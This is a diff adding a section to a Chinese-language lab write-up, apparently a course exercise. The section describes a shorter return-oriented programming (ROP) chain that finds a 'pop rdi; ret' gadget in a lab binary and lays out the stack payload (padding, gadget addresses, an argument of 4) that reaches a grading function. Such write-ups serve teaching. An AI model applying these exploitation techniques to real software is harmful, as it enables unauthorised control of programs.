@@ -350,6 +350,24 @@ d0 0f 80 00 10 72 00 00	-> 返回地址 = rsp =0x721000800fd0
 
 ![ROP](./images/7.png)
 
+## ROP更好的方式
+
+> 在完成Canary之后，发现上面的ROP过于麻烦，所以将上面的payload保存为`payload_rop_initial.py`
+
+观察到`  401a32:	41 5f  pop  %r15`  `401a34:	c3    	ret`这里`5f c3`正好对应`pop rdi; ret`，所以我们直接构造下面的输入即可
+
+```
+24Bytes     填充
+8Bytes      0x401a34    ret
+8Bytes      0x401a33    pop rdi; ret
+8Bytes      0x4         rdi
+8Bytes      0x401978    grade_eval
+```
+
+也成功输出了Hope A will be your grade! 
+
+![better-ROP](./images/9.png)
+
 ## Canary
 
 先观察dark-log的部分反汇编
